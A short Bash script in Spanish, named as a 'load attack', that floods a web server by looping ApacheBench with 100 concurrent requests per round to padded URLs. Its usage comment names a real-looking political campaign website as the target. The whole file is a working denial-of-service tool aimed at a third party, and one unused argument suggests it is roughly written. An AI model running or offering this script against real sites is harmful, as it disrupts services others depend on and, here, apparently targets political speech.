#!/bin/bash

# ./ataque_carga.sh 100razonesparanovotaramacri.com 2 texto_ataque.txt 

#direccion del ataque
DIRECCION="$1"
#cantidad de ataques
CANT_ATAQUES="$2"

#texto extenso a meter en el ataque
TEXT="eeeeeeeeeeeeeeeeeeeeeeee"

let CONTF+="$CANT_ATAQUES"
CONTI="0"
TEXT=$TEXT+$TEXT
while [ $CONTI -lt $CONTF ]; do

ab -n 100 -c 100 http://$DIRECCION/petes$TEXT.html

let CONTI+=1

done #fin bucle while
